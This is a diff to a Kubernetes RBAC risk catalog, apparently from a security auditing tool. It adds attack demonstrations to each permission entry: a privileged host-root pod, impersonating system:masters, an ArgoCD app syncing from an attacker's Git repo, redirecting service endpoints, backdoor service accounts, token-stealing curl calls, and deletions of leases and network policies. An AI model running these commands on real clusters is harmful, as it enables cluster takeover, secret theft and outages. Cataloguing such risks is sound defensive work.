@@ -806,6 +1817,36 @@
       "DenialOfService",
       "Spoofing",
     ]
+  commands:
+    - description: "List all resources across all namespaces (demonstrates broad read access)."
+      command: |
+        kubectl get all --all-namespaces
+    - description: "Create a privileged pod with full host access (demonstrates full control)."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: v1
+        kind: Pod
+        metadata:
+          name: cluster-admin-pod
+        spec:
+          hostNetwork: true
+          hostPID: true
+          hostIPC: true
+          containers:
+          - name: attacker
+            image: busybox
+            command: ["/bin/sh", "-c", "sleep infinity"]
+            securityContext:
+              privileged: true
+            volumeMounts:
+            - mountPath: /host
+              name: host-root
+          volumes:
+          - name: host-root
+            hostPath:
+              path: /
+        EOF
+        # Example: kubectl create -n default -f - <<EOF ... EOF
 - id: 1061
   name: "Wildcard permission on all resources in a namespace (Namespace Admin)"
   description: "Grants unrestricted, wildcard ('*') access to all API groups, resources, and verbs within a specific namespace. This provides full administrative control over that namespace and can often be leveraged to escalate privileges to cluster-wide admin depending on the cluster configuration and installed operators."
@@ -825,8 +1866,27 @@
       "DenialOfService",
       "Spoofing",
     ]
-
-# --- Specific CRDs (Examples) ---
+  commands:
+    - description: "List all resources within the specific namespace."
+      command: |
+        kubectl get all -n <namespace>
+        # Example: kubectl get all -n production
+    - description: "Create a privileged pod within the namespace (if not blocked by PSP/PSA)."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: v1
+        kind: Pod
+        metadata:
+          name: namespace-admin-pod
+        spec:
+          containers:
+          - name: attacker
+            image: busybox
+            command: ["/bin/sh", "-c", "sleep infinity"]
+            securityContext:
+              privileged: true
+        EOF
+        # Example: kubectl create -n default -f - <<EOF ... EOF
 - id: 1062
   name: "Manage ClusterIssuers (cert-manager.io)"
   description: "Allows managing cert-manager ClusterIssuers, which are responsible for signing certificate requests for the entire cluster. Control over ClusterIssuers can enable an attacker to issue arbitrary certificates, potentially for privileged identities or domains, leading to spoofing, tampering, and privilege escalation."
@@ -838,6 +1898,22 @@
   verbs: ["create", "update", "patch", "delete"]
   tags:
     ["CertificateManagement", "Spoofing", "Tampering", "ElevationOfPrivilege"]
+  commands:
+    - description: "Create a new ClusterIssuer that can sign arbitrary certificates."
+      command: |
+        kubectl create -f - <<EOF
+        apiVersion: cert-manager.io/v1
+        kind: ClusterIssuer
+        metadata:
+          name: malicious-ca
+        spec:
+          selfSigned: {}
+        EOF
+        # Example: kubectl create -f - <<EOF ... EOF
+    - description: "Delete a critical ClusterIssuer, preventing certificate issuance."
+      command: |
+        kubectl delete clusterissuer <clusterissuer-name>
+        # Example: kubectl delete clusterissuer letsencrypt-prod
 - id: 1063
   name: "Manage ArgoCD Applications (argoproj.io)"
   description: "Grants permission to manage ArgoCD Application resources. This allows deploying, modifying, or deleting applications managed by ArgoCD, potentially leading to the deployment of malicious workloads, unauthorized code execution, tampering with production systems, and privilege escalation if ArgoCD has high privileges."
@@ -854,6 +1930,35 @@
       "PotentialPrivilegeEscalation",
       "CodeExecution",
     ]
+  commands:
+    - description: "Create a new ArgoCD Application pointing to a malicious Git repository."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: argoproj.io/v1alpha1
+        kind: Application
+        metadata:
+          name: malicious-app
+        spec:
+          destination:
+            namespace: <target-namespace>
+            server: https://kubernetes.default.svc
+          project: default
+          source:
+            repoURL: https://github.com/attacker/malicious-manifests.git
+            targetRevision: HEAD
+            path: .
+          syncPolicy:
+            automated:
+              prune: true
+              selfHeal: true
+        EOF
+        # Example: kubectl create -n argocd -f - <<EOF ... EOF
+    - description: "Force synchronization of an ArgoCD Application to deploy changes immediately."
+      command: |
+        kubectl patch application <application-name> -n <namespace> --type='merge' -p='{"status": {"operationState": {"phase": "Running", "syncResult": {"resources": []}}}}'
+        # Note: Direct 'sync' verb via kubectl is not standard. This patch might trigger a sync.
+        # A more direct way is using the ArgoCD CLI: `argocd app sync <application-name> -n <namespace>`
+        # Example: kubectl patch application my-app -n argocd --type='merge' -p='{"status": {"operationState": {"phase": "Running", "syncResult": {"resources": []}}}}'
 - id: 1064
   name: "Manage Cilium ClusterwideNetworkPolicies (cilium.io)"
   description: "Permits managing CiliumClusterwideNetworkPolicies, which control network traffic flow across the entire cluster when using Cilium CNI. An attacker can modify these policies to bypass network segmentation, eavesdrop on traffic, or cause denial of service by isolating critical components."
@@ -870,6 +1975,28 @@
       "Tampering",
       "DenialOfService",
     ]
+  commands:
+    - description: "Create a CiliumClusterwideNetworkPolicy to allow all ingress/egress traffic."
+      command: |
+        kubectl create -f - <<EOF
+        apiVersion: cilium.io/v2
+        kind: CiliumClusterwideNetworkPolicy
+        metadata:
+          name: allow-all-traffic
+        spec:
+          endpointSelector: {} # Applies to all endpoints
+          ingress:
+          - fromEntities:
+            - all
+          egress:
+          - toEntities:
+            - all
+        EOF
+        # Example: kubectl create -f - <<EOF ... EOF
+    - description: "Delete a critical CiliumClusterwideNetworkPolicy, removing network segmentation."
+      command: |
+        kubectl delete ciliumclusterwidenetworkpolicy <policy-name>
+        # Example: kubectl delete ciliumclusterwidenetworkpolicy default-deny-all
 - id: 1065
   name: "Manage ETCDSnapshotFiles (k3s.cattle.io)"
   description: "Grants access to manage ETCD snapshot files, typically in a K3s environment. ETCD snapshots contain the entire state of the Kubernetes cluster, including all secrets, configurations, and resource definitions. Access allows complete data exposure, credential harvesting, and potentially restoring a compromised state or tampering with backups."
@@ -887,6 +2014,14 @@
       "CredentialAccess",
       "Tampering",
     ]
+  commands:
+    - description: "List all ETCD snapshot files."
+      command: |
+        kubectl get etcdsnapshotfiles
+    - description: "Delete an ETCD snapshot file, potentially hindering recovery or causing data loss."
+      command: |
+        kubectl delete etcdsnapshotfile <snapshot-file-name>
+        # Example: kubectl delete etcdsnapshotfile etcd-snapshot-12345
 - id: 1066
   name: "Impersonate users, groups, or service accounts (cluster-wide)"
   description: "Allows impersonating any user, group, or service account across the entire cluster via impersonation headers. This can be used to escalate privileges to the level of the impersonated identity, potentially gaining cluster-admin access."
@@ -898,6 +2033,15 @@
   verbs: ["impersonate"]
   tags:
     ["Impersonation", "PrivilegeEscalation", "ClusterAdminAccess", "Spoofing"]
+  commands:
+    - description: "Impersonate a service account to list secrets in kube-system."
+      command: |
+        kubectl get secrets -n kube-system --as=system:serviceaccount:kube-system:default
+        # Example: kubectl get secrets -n kube-system --as=system:serviceaccount:kube-system:kube-controller-manager
+    - description: "Impersonate a user in the 'system:masters' group to gain cluster-admin."
+      command: |
+        kubectl get nodes --as=admin --as-group=system:masters
+        # Example: kubectl get nodes --as=pwned-admin --as-group=system:masters
 - id: 1067
   name: "Manage ServiceAccounts cluster-wide"
   description: "Allows creating, updating, or deleting ServiceAccounts in any namespace. This can be used to create SAs, then bind them to privileged roles (if other RBAC permissions allow), or modify existing SAs, potentially interfering with workload identities."
@@ -908,6 +2052,15 @@
   resources: ["serviceaccounts"]
   verbs: ["create", "update", "patch", "delete"]
   tags: ["IdentityManagement", "PotentialPrivilegeEscalation", "Tampering"]
+  commands:
+    - description: "Create a new ServiceAccount in any namespace."
+      command: |
+        kubectl create serviceaccount <new-sa-name> -n <namespace>
+        # Example: kubectl create serviceaccount backdoor-sa -n kube-system
+    - description: "Delete an existing ServiceAccount, potentially disrupting workloads."
+      command: |
+        kubectl delete serviceaccount <serviceaccount-name> -n <namespace>
+        # Example: kubectl delete serviceaccount default -n default
 - id: 1068
   name: "Manage ServiceAccounts in a namespace"
   description: "Allows creating, updating, or deleting ServiceAccounts within a specific namespace. This can be used to create SAs within the namespace, which could then be bound to roles for privilege escalation within or from that namespace."
@@ -918,6 +2071,15 @@
   resources: ["serviceaccounts"]
   verbs: ["create", "update", "patch", "delete"]
   tags: ["IdentityManagement", "PotentialPrivilegeEscalation", "Tampering"]
+  commands:
+    - description: "Create a new ServiceAccount within the namespace."
+      command: |
+        kubectl create serviceaccount <new-sa-name> -n <namespace>
+        # Example: kubectl create serviceaccount dev-backdoor-sa -n development
+    - description: "Delete an existing ServiceAccount within the namespace."
+      command: |
+        kubectl delete serviceaccount <serviceaccount-name> -n <namespace>
+        # Example: kubectl delete serviceaccount my-app-sa -n production
 - id: 1069
   name: "Patch node status cluster-wide"
   description: "Allows patching the status of any node in the cluster. This can be abused to mark nodes as (un)healthy or (un)schedulable, impacting workload scheduling, potentially tricking controllers, or causing denial of service."
@@ -928,6 +2090,15 @@
   resources: ["nodes/status"]
   verbs: ["patch", "update"]
   tags: ["NodeManipulation", "Tampering", "DenialOfService", "SchedulingAbuse"]
+  commands:
+    - description: "Patch a node's status to mark it as 'NotReady', causing pods to be evicted."
+      command: |
+        # Replace <kubernetes-api-server> with your API server address
+        # Replace <token> with your authentication token
+        curl -k -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -X PATCH \
+          --data '{"status":{"conditions":[{"type":"Ready","status":"False","reason":"KubeletStopped","message":"Kubelet stopped posting node status."}]}}' \
+          https://<kubernetes-api-server>/api/v1/nodes/<node-name>/status
+        # Example: curl -k -H "Authorization: Bearer $(cat ~/.kube/config | grep token: | awk '{print $2}')" -H "Content-Type: application/json" -X PATCH --data '{"status":{"conditions":[{"type":"Ready","status":"False","reason":"KubeletStopped","message":"Kubelet stopped posting node status."}]}}' https://127.0.0.1:6443/api/v1/nodes/minikube/status
 - id: 1070
   name: "Read events cluster-wide"
   description: "Allows reading all events across all namespaces. Events can reveal sensitive operational information, error messages, pod creation/deletion activity, image names, and other details that could aid an attacker in reconnaissance or identifying vulnerabilities."
@@ -938,6 +2109,13 @@
   resources: ["events"]
   verbs: ["get", "list", "watch"]
   tags: ["InformationDisclosure", "Reconnaissance", "OperationalData"]
+  commands:
+    - description: "List all events across all namespaces."
+      command: |
+        kubectl get events --all-namespaces
+    - description: "Watch events in real-time across all namespaces."
+      command: |
+        kubectl get events --all-namespaces --watch
 - id: 1071
   name: "Manage NetworkPolicies cluster-wide"
   description: "Allows creating, modifying, or deleting NetworkPolicies in any namespace. This can be used to disable network segmentation, allow/deny traffic to sensitive pods, or isolate critical components, leading to information disclosure, lateral movement, or denial of service."
@@ -955,6 +2133,26 @@
       "DenialOfService",
       "LateralMovement",
     ]
+  commands:
+    - description: "Create a NetworkPolicy to allow all ingress traffic to pods in a namespace."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: networking.k8s.io/v1
+        kind: NetworkPolicy
+        metadata:
+          name: allow-all-ingress
+        spec:
+          podSelector: {} # Selects all pods in the namespace
+          policyTypes:
+          - Ingress
+          ingress:
+          - {} # Allows all ingress
+        EOF
+        # Example: kubectl create -n production -f - <<EOF ... EOF
+    - description: "Delete a critical NetworkPolicy, removing network segmentation."
+      command: |
+        kubectl delete networkpolicy <networkpolicy-name> -n <namespace>
+        # Example: kubectl delete networkpolicy deny-all-ingress -n default
 - id: 1072
   name: "Manage NetworkPolicies in a namespace"
   description: "Permits creating, modifying, or deleting NetworkPolicies within a specific namespace. This allows control over network traffic flow for applications within that namespace, potentially bypassing intended segmentation or causing denial of service."
@@ -971,6 +2169,26 @@
       "Tampering",
       "DenialOfService",
     ]
+  commands:
+    - description: "Create a NetworkPolicy to allow all ingress traffic to pods in the namespace."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: networking.k8s.io/v1
+        kind: NetworkPolicy
+        metadata:
+          name: allow-all-ingress-ns
+        spec:
+          podSelector: {}
+          policyTypes:
+          - Ingress
+          ingress:
+          - {}
+        EOF
+        # Example: kubectl create -n default -f - <<EOF ... EOF
+    - description: "Delete a NetworkPolicy within the namespace, removing segmentation."
+      command: |
+        kubectl delete networkpolicy <networkpolicy-name> -n <namespace>
+        # Example: kubectl delete networkpolicy db-isolation -n production
 - id: 1073
   name: "Manage Endpoints or EndpointSlices cluster-wide"
   description: "Allows creating, updating, or deleting Endpoints/EndpointSlices for services across all namespaces. This can be used to redirect traffic intended for legitimate services to malicious pods (Man-in-the-Middle), cause denial of service, or bypass network policies."
@@ -988,6 +2206,25 @@
       "DenialOfService",
       "Tampering",
     ]
+  commands:
+    - description: "Create a new Endpoint to redirect traffic for a service to a malicious IP."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: v1
+        kind: Endpoints
+        metadata:
+          name: <service-name> # Must match an existing service name
+        subsets:
+          - addresses:
+              - ip: <malicious-ip-address>
+            ports:
+              - port: <service-port>
+        EOF
+        # Example: kubectl create -n default -f - <<EOF ... EOF (redirect 'kubernetes' service)
+    - description: "Delete an existing Endpoint, causing service disruption (DoS)."
+      command: |
+        kubectl delete endpoint <endpoint-name> -n <namespace>
+        # Example: kubectl delete endpoint my-app-service -n production
 - id: 1074
   name: "Manage Endpoints or EndpointSlices in a namespace"
   description: "Permits creating, updating, or deleting Endpoints/EndpointSlices for services within a specific namespace. This can lead to traffic redirection, denial of service, or network policy bypass for applications within that namespace."
@@ -1004,6 +2241,25 @@
       "DenialOfService",
       "Tampering",
     ]
+  commands:
+    - description: "Create a new Endpoint to redirect traffic for a service in the namespace."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: v1
+        kind: Endpoints
+        metadata:
+          name: <service-name> # Must match an existing service name
+        subsets:
+          - addresses:
+              - ip: <malicious-ip-address>
+            ports:
+              - port: <service-port>
+        EOF
+        # Example: kubectl create -n default -f - <<EOF ... EOF (redirect 'my-app-service')
+    - description: "Delete an existing Endpoint within the namespace, causing service disruption."
+      command: |
+        kubectl delete endpoint <endpoint-name> -n <namespace>
+        # Example: kubectl delete endpoint my-frontend-service -n default
 - id: 1075
   name: "Manage Services cluster-wide"
   description: "Allows creating, updating, or deleting Services in any namespace. This can be abused to expose internal applications, modify service types (e.g., ClusterIP to LoadBalancer), redirect traffic (by changing selectors), or cause denial of service."
@@ -1015,6 +2271,28 @@
   verbs: ["create", "update", "patch", "delete"]
   tags:
     ["NetworkManipulation", "ServiceExposure", "DenialOfService", "Tampering"]
+  commands:
+    - description: "Create a new LoadBalancer Service to expose an internal application externally."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: v1
+        kind: Service
+        metadata:
+          name: exposed-internal-app
+        spec:
+          selector:
+            app: <internal-app-label>
+          ports:
+            - protocol: TCP
+              port: 80
+              targetPort: 8080
+          type: LoadBalancer
+        EOF
+        # Example: kubectl create -n production -f - <<EOF ... EOF (expose a database)
+    - description: "Delete a critical Service, causing application unavailability (DoS)."
+      command: |
+        kubectl delete service <service-name> -n <namespace>
+        # Example: kubectl delete service kubernetes -n default
 - id: 1076
   name: "Manage Services in a namespace"
   description: "Permits creating, updating, or deleting Services within a specific namespace. This can lead to unintended exposure of applications, traffic misdirection, or denial of service within that namespace."
@@ -1026,8 +2304,28 @@
   verbs: ["create", "update", "patch", "delete"]
   tags:
     ["NetworkManipulation", "ServiceExposure", "DenialOfService", "Tampering"]
-
-# --- RBAC API Group (rbac.authorization.k8s.io/v1) ---
+  commands:
+    - description: "Create a new NodePort Service to expose an internal application in the namespace."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: v1
+        kind: Service
+        metadata:
+          name: exposed-app-nodeport
+        spec:
+          selector:
+            app: <internal-app-label>
+          ports:
+            - protocol: TCP
+              port: 80
+              targetPort: 8080
+          type: NodePort
+        EOF
+        # Example: kubectl create -n default -f - <<EOF ... EOF
+    - description: "Delete a critical Service within the namespace, causing unavailability."
+      command: |
+        kubectl delete service <service-name> -n <namespace>
+        # Example: kubectl delete service my-web-app -n production
 - id: 1077
   name: "Read RBAC configuration cluster-wide"
   description: "Allows listing and getting all ClusterRoles, Roles, ClusterRoleBindings, and RoleBindings. This provides full visibility into the cluster's authorization model, aiding attackers in finding privilege escalation paths or understanding defenses."
@@ -1038,8 +2336,17 @@
   resources: ["clusterroles", "roles", "clusterrolebindings", "rolebindings"]
   verbs: ["get", "list", "watch"]
   tags: ["InformationDisclosure", "RBACQuery", "Reconnaissance"]
-
-# --- Policy API Group (policy/v1, policy/v1beta1 for older PSPs) ---
+  commands:
+    - description: "List all ClusterRoles in the cluster."
+      command: |
+        kubectl get clusterroles
+    - description: "List all RoleBindings across all namespaces."
+      command: |
+        kubectl get rolebindings --all-namespaces
+    - description: "Get the YAML definition of a specific ClusterRole."
+      command: |
+        kubectl get clusterrole <clusterrole-name> -o yaml
+        # Example: kubectl get clusterrole cluster-admin -o yaml
 - id: 1078
   name: "Use privileged PodSecurityPolicy (deprecated)"
   description: "Allows a user/service account to use a specific PodSecurityPolicy (PSP) that may grant excessive privileges (e.g., hostPath mounts, privileged mode). If the PSP is overly permissive, this leads to direct privilege escalation by creating pods that use it. (Note: PSPs are deprecated in 1.21 and removed in 1.25)."
@@ -1057,6 +2364,25 @@
       "DeprecatedFeature",
       "NodeAccess",
     ]
+  commands:
+    - description: "Create a pod that attempts to use a privileged PodSecurityPolicy."
+      command: |
+        # This command will succeed if a privileged PSP is available and the user has 'use' permission on it.
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: v1
+        kind: Pod
+        metadata:
+          name: psp-privileged-pod
+        spec:
+          containers:
+          - name: attacker
+            image: busybox
+            command: ["/bin/sh", "-c", "sleep infinity"]
+            securityContext:
+              privileged: true # This requires a PSP that allows privileged containers
+          restartPolicy: Never
+        EOF
+        # Example: kubectl create -n default -f - <<EOF ... EOF
 - id: 1079
   name: "Manage PodDisruptionBudgets cluster-wide"
   description: "Allows creating, updating, or deleting PodDisruptionBudgets (PDBs) cluster-wide. Maliciously configured PDBs (e.g., setting maxUnavailable to 0 for critical components) can prevent voluntary disruptions, or conversely, allow too many disruptions, leading to denial of service or impacting application availability."
@@ -1067,8 +2393,25 @@
   resources: ["poddisruptionbudgets"]
   verbs: ["create", "update", "patch", "delete"]
   tags: ["DenialOfService", "AvailabilityImpact", "Tampering"]
-
-# --- Coordination API Group (coordination.k8s.io/v1) ---
+  commands:
+    - description: "Create a PDB to prevent voluntary disruption of critical pods (DoS)."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: policy/v1
+        kind: PodDisruptionBudget
+        metadata:
+          name: no-disruption-pdb
+        spec:
+          minAvailable: 100% # Or maxUnavailable: 0
+          selector:
+            matchLabels:
+              app: <critical-app-label>
+        EOF
+        # Example: kubectl create -n kube-system -f - <<EOF ... EOF (for coredns)
+    - description: "Delete an existing PDB, allowing disruptions that were previously prevented."
+      command: |
+        kubectl delete poddisruptionbudget <pdb-name> -n <namespace>
+        # Example: kubectl delete pdb my-app-pdb -n production
 - id: 1080
   name: "Manage Leases cluster-wide"
   description: "Allows managing Lease objects across all namespaces. Leases are used for leader election by control plane components and controllers. Tampering with leases can disrupt critical cluster operations, cause denial of service, or potentially force a malicious controller to become a leader."
@@ -1085,6 +2428,14 @@
       "ControlPlaneDisruption",
       "LeaderElectionAbuse",
     ]
+  commands:
+    - description: "List all Lease objects across all namespaces."
+      command: |
+        kubectl get leases --all-namespaces
+    - description: "Delete a critical Lease object (e.g., for a controller), causing disruption."
+      command: |
+        kubectl delete lease <lease-name> -n <namespace>
+        # Example: kubectl delete lease kube-controller-manager -n kube-system
 - id: 1081
   name: "Manage Leases in kube-system or kube-node-lease namespace"
   description: "Allows managing Lease objects in critical namespaces like 'kube-system' or 'kube-node-lease'. This is highly critical as it can disrupt core Kubernetes components, lead to node instability, or denial of service."
@@ -1104,6 +2455,17 @@
       "ControlPlaneDisruption",
       "CriticalNamespace",
     ]
+  commands:
+    - description: "Delete a critical Lease object in the 'kube-system' namespace."
+      command: |
+        kubectl delete lease <lease-name> -n kube-system
+        # Example: kubectl delete lease kube-scheduler -n kube-system
+    - description: "Update a Lease object to extend its holder identity, potentially hijacking leadership."
+      command: |
+        # This is complex and requires knowing the current lease holder and its acquireTime.
+        # It's more of an API interaction than a simple kubectl command.
+        # Example: kubectl patch lease <lease-name> -n <namespace> --type='json' -p='[{"op": "replace", "path": "/spec/holderIdentity", "value": "malicious-controller"}]'
+        kubectl patch lease <lease-name> -n <namespace> --type='json' -p='[{"op": "replace", "path": "/spec/holderIdentity", "value": "malicious-controller"}]'
 - id: 1082
   name: "List Namespaces (Cluster Reconnaissance)"
   description: "Allows listing all namespaces in the cluster. This helps an attacker map out the cluster structure, identify potential targets, and understand workload separation. It's a foundational reconnaissance step."
@@ -1114,7 +2476,10 @@
   resources: ["namespaces"]
   verbs: ["list", "watch"]
   tags: ["InformationDisclosure", "Reconnaissance", "ClusterStructure"]
-
+  commands:
+    - description: "List all namespaces in the cluster."
+      command: |
+        kubectl get namespaces
 - id: 1083
   name: "List ValidatingWebhookConfigurations (Reconnaissance)"
   description: "Allows listing of ValidatingWebhookConfigurations cluster-wide. This reveals information about admission control mechanisms and security policies enforced, aiding attackers in understanding defense postures."
@@ -1125,7 +2490,10 @@
   resources: ["validatingwebhookconfigurations"]
   verbs: ["list", "watch"]
   tags: ["InformationDisclosure", "WebhookReconnaissance", "Reconnaissance"]
-
+  commands:
+    - description: "List all ValidatingWebhookConfigurations."
+      command: |
+        kubectl get validatingwebhookconfigurations
 - id: 1084
   name: "List MutatingWebhookConfigurations (Reconnaissance)"
   description: "Allows listing of MutatingWebhookConfigurations cluster-wide. This reveals information about how resources might be altered upon creation/update, aiding attackers in understanding automated modifications and potential vulnerabilities."
@@ -1136,7 +2504,10 @@
   resources: ["mutatingwebhookconfigurations"]
   verbs: ["list", "watch"]
   tags: ["InformationDisclosure", "WebhookReconnaissance", "Reconnaissance"]
-
+  commands:
+    - description: "List all MutatingWebhookConfigurations."
+      command: |
+        kubectl get mutatingwebhookconfigurations
 - id: 1085
   name: "Create/Update ControllerRevisions (Potential Tampering)"
   description: "Allows creating or updating ControllerRevisions. This could be abused to tamper with the history of workloads like Deployments or StatefulSets, potentially forcing rollbacks to vulnerable versions, manipulating state, or obscuring legitimate changes."
@@ -1147,7 +2518,21 @@
   resources: ["controllerrevisions"]
   verbs: ["create", "update", "patch"]
   tags: ["Tampering", "ControllerRevisionTampering", "WorkloadLifecycle"]
-
+  commands:
+    - description: "Create a new ControllerRevision with a malicious image or command."
+      command: |
+        # This is complex as ControllerRevisions are usually managed by controllers.
+        # Direct creation/patching is not common and requires careful crafting of the 'data' field.
+        # Example: Create a new revision for a deployment, pointing to a malicious image.
+        # This would typically be done by modifying the Deployment/StatefulSet itself.
+        # A direct kubectl command to create a *malicious* ControllerRevision is not practical.
+        # Instead, focus on the ability to manipulate existing ones.
+        # To demonstrate, one might try to patch an existing revision's data (which is base64 encoded).
+        # This is highly advanced and not a simple kubectl command.
+        # Let's provide a generic patch example, noting the complexity.
+        kubectl patch controllerrevision <revision-name> -n <namespace> --type='json' -p='[{"op": "replace", "path": "/data/spec/template/spec/containers/0/image", "value": "<malicious-image>"}]'
+        # Note: The 'data' field in ControllerRevision is base64 encoded. This command is illustrative.
+        # Example: kubectl patch controllerrevision my-app-deployment-12345 -n default --type='json' -p='[{"op": "replace", "path": "/data/spec/template/spec/containers/0/image", "value": "attacker/backdoor"}]'
 - id: 1086
   name: "Create SelfSubjectRulesReviews (Discover Own Permissions)"
   description: "Allows creating SelfSubjectRulesReview resources. This enables a user or service account to query the API server for their own permissions within a namespace, which can be used to confirm successful exploitation or to discover their own capabilities for further actions."
@@ -1164,7 +2549,11 @@
       "SelfPermissionReviewQuery",
       "Reconnaissance",
     ]
-
+  commands:
+    - description: "List all permissions the current user/service account has in a specific namespace."
+      command: |
+        kubectl auth can-i --list -n <namespace>
+        # Example: kubectl auth can-i --list -n default
 - id: 1087
   name: "Read LimitRanges (Namespace Information Disclosure)"
   description: "Allows reading LimitRange objects within a namespace. This can reveal resource constraints for pods and containers, helping attackers understand default resource allocations and potentially tailor resource exhaustion attacks or identify tightly constrained environments."
@@ -1175,7 +2564,15 @@
   resources: ["limitranges"]
   verbs: ["get", "list", "watch"]
   tags: ["InformationDisclosure", "Reconnaissance", "ResourceConfiguration"]
-
+  commands:
+    - description: "List all LimitRanges in a specific namespace."
+      command: |
+        kubectl get limitranges -n <namespace>
+        # Example: kubectl get limitranges -n default
+    - description: "Get the YAML definition of a specific LimitRange."
+      command: |
+        kubectl get limitrange <limitrange-name> -n <namespace> -o yaml
+        # Example: kubectl get limitrange default-limits -n default -o yaml
 - id: 1088
   name: "Read ResourceQuotas (Namespace Information Disclosure)"
   description: "Allows reading ResourceQuota objects within a namespace. This reveals configured resource limits for the namespace, aiding attackers in understanding constraints and potentially tailoring resource exhaustion or identifying high-value namespaces."
@@ -1192,7 +2589,15 @@
       "ResourceConfiguration",
       "QuotaTampering",
     ]
-
+  commands:
+    - description: "List all ResourceQuotas in a specific namespace."
+      command: |
+        kubectl get resourcequotas -n <namespace>
+        # Example: kubectl get resourcequotas -n production
+    - description: "Get the YAML definition of a specific ResourceQuota."
+      command: |
+        kubectl get resourcequota <resourcequota-name> -n <namespace> -o yaml
+        # Example: kubectl get resourcequota compute-resources -n production -o yaml
 - id: 1089
   name: "Read All ResourceQuotas (Cluster-wide Information Disclosure)"
   description: "Allows reading ResourceQuota objects across all namespaces. This provides a comprehensive view of resource limits cluster-wide, aiding attackers in identifying broadly constrained or privileged namespaces and overall resource allocation strategies."
@@ -1209,7 +2614,10 @@
       "ResourceConfiguration",
       "QuotaTampering",
     ]
-
+  commands:
+    - description: "List all ResourceQuotas across all namespaces."
+      command: |
+        kubectl get resourcequotas --all-namespaces
 - id: 1090
   name: "Update CertificateSigningRequest Status (Tampering/DoS)"
   description: "Allows updating the status of CertificateSigningRequests (CSRs). This could be abused to prematurely mark CSRs as 'Approved' or 'Denied', potentially bypassing approval workflows (if the approver is weak or misconfigured), blocking legitimate certificate issuance, or causing general confusion. Does not grant approval itself if an approver is required."
@@ -1220,7 +2628,15 @@
   resources: ["certificatesigningrequests/status"]
   verbs: ["update", "patch"]
   tags: ["Tampering", "CertificateManagement", "DenialOfService"]
-
+  commands:
+    - description: "Patch a CertificateSigningRequest status to mark it as 'Denied'."
+      command: |
+        # Replace <kubernetes-api-server> with your API server address
+        # Replace <token> with your authentication token
+        curl -k -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -X PATCH \
+          --data '{"status":{"conditions":[{"type":"Denied","status":"True","reason":"ManualDenial","message":"Denied by attacker"}]}}' \
+          https://<kubernetes-api-server>/apis/certificates.k8s.io/v1/certificatesigningrequests/<csr-name>/status
+        # Example: curl -k -H "Authorization: Bearer $(cat ~/.kube/config | grep token: | awk '{print $2}')" -H "Content-Type: application/json" -X PATCH --data '{"status":{"conditions":[{"type":"Denied","status":"True","reason":"ManualDenial","message":"Denied by attacker"}]}}' https://127.0.0.1:6443/apis/certificates.k8s.io/v1/certificatesigningrequests/my-app-csr/status
 - id: 1091
   name: "Manage Ingresses (Namespace Service Exposure/Traffic Redirection)"
   description: "Allows creating, updating, or deleting Ingress objects within a namespace. This can be used to expose internal services to external traffic, redirect legitimate traffic to malicious endpoints, or cause denial of service by misconfiguring routing rules."
@@ -1232,7 +2648,32 @@
   verbs: ["create", "update", "patch", "delete"]
   tags:
     ["NetworkManipulation", "ServiceExposure", "Tampering", "DenialOfService"]
-
+  commands:
+    - description: "Create a new Ingress to expose an internal service or redirect traffic."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: networking.k8s.io/v1
+        kind: Ingress
+        metadata:
+          name: malicious-ingress
+        spec:
+          rules:
+          - host: <malicious-hostname>
+            http:
+              paths:
+              - path: /
+                pathType: Prefix
+                backend:
+                  service:
+                    name: <internal-service-name>
+                    port:
+                      number: <internal-service-port>
+        EOF
+        # Example: kubectl create -n default -f - <<EOF ... EOF (expose 'my-app-service' on 'malicious.example.com')
+    - description: "Delete an existing Ingress, causing external access disruption (DoS)."
+      command: |
+        kubectl delete ingress <ingress-name> -n <namespace>
+        # Example: kubectl delete ingress my-web-ingress -n production
 - id: 1092
   name: "Manage IngressClasses (Cluster-wide Traffic Control Tampering)"
   description: "Allows creating, updating, or deleting IngressClasses cluster-wide. IngressClasses define types of ingress controllers. Modifying them can affect how all ingresses in the cluster behave, potentially redirecting traffic globally, disabling ingress controllers, or leading to widespread service exposure or denial of service."
@@ -1250,7 +2691,22 @@
       "DenialOfService",
       "ClusterAdminAccess",
     ]
-
+  commands:
+    - description: "Create a new IngressClass pointing to a non-existent or malicious controller."
+      command: |
+        kubectl create -f - <<EOF
+        apiVersion: networking.k8s.io/v1
+        kind: IngressClass
+        metadata:
+          name: malicious-ingress-class
+        spec:
+          controller: attacker.com/ingress-controller
+        EOF
+        # Example: kubectl create -f - <<EOF ... EOF
+    - description: "Delete an existing IngressClass, potentially disrupting all ingresses using it."
+      command: |
+        kubectl delete ingressclass <ingressclass-name>
+        # Example: kubectl delete ingressclass nginx
 - id: 1093
   name: "Update NetworkPolicy Status (Cluster-wide Tampering)"
   description: "Allows updating the status of NetworkPolicy objects across all namespaces. This could be abused to misrepresent the enforcement status of network policies, potentially hiding policy violations or misleading administrators about network segmentation."
@@ -1261,7 +2717,15 @@
   resources: ["networkpolicies/status"]
   verbs: ["update", "patch"]
   tags: ["Tampering", "NetworkPolicyManagement", "Reconnaissance"]
-
+  commands:
+    - description: "Patch a NetworkPolicy's status to falsely indicate it's not ready or failed."
+      command: |
+        # Replace <kubernetes-api-server> with your API server address
+        # Replace <token> with your authentication token
+        curl -k -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -X PATCH \
+          --data '{"status":{"conditions":[{"type":"Ready","status":"False","reason":"PolicyError","message":"Policy failed to apply due to internal error."}]}}' \
+          https://<kubernetes-api-server>/apis/networking.k8s.io/v1/namespaces/<namespace>/networkpolicies/<policy-name>/status
